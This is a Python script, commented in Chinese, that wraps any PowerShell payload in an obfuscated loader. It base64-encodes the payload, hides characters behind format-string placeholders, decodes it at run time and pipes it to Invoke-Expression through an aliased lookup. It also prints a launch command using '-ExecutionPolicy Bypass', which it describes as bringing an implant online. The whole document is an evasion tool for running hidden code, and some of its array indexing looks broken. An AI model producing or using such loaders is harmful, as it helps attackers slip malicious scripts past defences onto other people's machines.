# -!- coding: utf-8 -!-
import base64
import re

# C:\Users\iframe\OneDrive\桌面\test.ps1
def powershell_fix():
    f=open(input('输入ps1路径：'))
    payload=f.read()
    print(payload)
    payload=str(base64.b64encode(payload.encode('utf-8')))
    payload=re.findall('^(?:b\')(.+)(?:\')$',payload)[0]
    print(payload)
    length=len(payload)
    payload1=payload[0:length//2]
    payload2=payload[length//2:-1]+"="
    def fix(str):
        q=re.sub('(x)','{0}',str)
        q=re.sub('(S)','{1}',q)
        return q
    py=f"""
    $D=@{{}}
    $d.d="x"
    $D.a="in"
    $D.z="S"
    $id=@("i","e","{{0}}","{{1}}") -f $d.d,$D.z"""
    py1="""
    $D.N="{0}" -f $id[4],$id[6]
    $D.C="{1}" -f $id[4],$id[6]""".format(fix(payload1),fix(payload2))
    py2=f"""
    ("[{{3}}y{{3}}tem.Te{{4}}t.Encoding]::UTF8.Get{{3}}tr{{2}}g([{{3}}y{{3}}tem.Convert]::FromBa{{3}}e64Str{{2}}g(""{{0}}{{1}}""))"-f $D.N,$D.c,$D.a,$D.z,$id[4]) | &(GAL I*X) | &("{{0}}{{1}}{{2}}" -f $id[0],$id[2],$d.d)
    """
    print(py+py1+py2)
    print("\n"+"\n"+"生成在根目录下powershell.ps1中")
    print("\n" + "上线命令：powershell.exe -ExecutionPolicy Bypass -File .\powershell.ps1")
    f=open(".\powershell.ps1","w+")
    f.write(py+py1+py2)
    f.close()
